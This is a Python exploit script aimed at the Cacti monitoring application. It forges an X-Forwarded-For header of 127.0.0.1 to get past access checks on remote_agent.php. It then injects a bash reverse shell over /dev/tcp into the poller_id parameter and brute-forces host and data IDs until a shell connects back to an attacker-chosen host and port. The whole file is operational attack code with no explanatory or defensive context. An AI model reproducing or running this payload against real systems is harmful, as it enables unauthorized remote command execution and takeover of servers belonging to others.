import argparse, httpx, base64, urllib, asyncio
from urllib.parse import urlparse
from collections import OrderedDict

async def send_request(url, lhost, lport, host_id, local_data_ids):
    headers = OrderedDict([("X-Forwarded-For", '127.0.0.1')])
    payload = urllib.parse.quote(f";bash -c '0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196'")
    endpoint = f'{url}/remote_agent.php?action=polldata&local_data_ids[]={local_data_ids}&host_id={host_id}&poller_id=1{payload}'
    try:
        async with httpx.AsyncClient() as client:
            await client.get(endpoint, headers=headers, timeout=10)
    except httpx.ReadTimeout:
        print("[+] Success, check shell")

async def exploit(url, lhost, lport):
    tasks = [send_request(url, lhost, lport, host_id, local_data_ids) for local_data_ids in range(1, 10) for host_id in range(1, 10)]
    await asyncio.gather(*tasks)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-url', help='URL of cacti application http://192.168.1.2', required=True)
    parser.add_argument('-lhost', help='Host to catch reverse shell', required=True)
    parser.add_argument('-lport', help='Port to catch reverse shell', required=True)
    args = parser.parse_args()

    print("[+] Starting brute force")
    asyncio.run(exploit(args.url, args.lhost, args.lport))
    print("[+] If you did not catch a shell adjust the brute force range")


if __name__ == '__main__':
    main()
